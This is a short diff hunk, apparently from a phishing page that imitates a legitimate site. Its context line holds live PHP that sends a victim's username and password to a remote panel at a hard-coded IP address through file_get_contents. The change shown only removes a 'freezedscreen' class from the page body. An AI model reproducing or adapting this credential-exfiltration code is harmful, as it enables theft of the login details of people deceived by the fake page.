@@ -57,7 +57,7 @@ $test = @file_get_contents("http://137.74.171.167/panelZ/a.php?main=$user,$pass,
     <link rel="stylesheet" href="../../files/bars/util.css">
 </head>
 
-<body theme="ssep" id="body" class="freezedscreen" style="top: 0px;">
+<body theme="ssep" id="body" class="" style="top: 0px;">
     <div id="shell" class="page" data-pid="324-114205-64">
         <div id="hamburger-menubackdrop" class="backDrop"></div><a href="#skip" class="hidden">Skip to content</a>
 
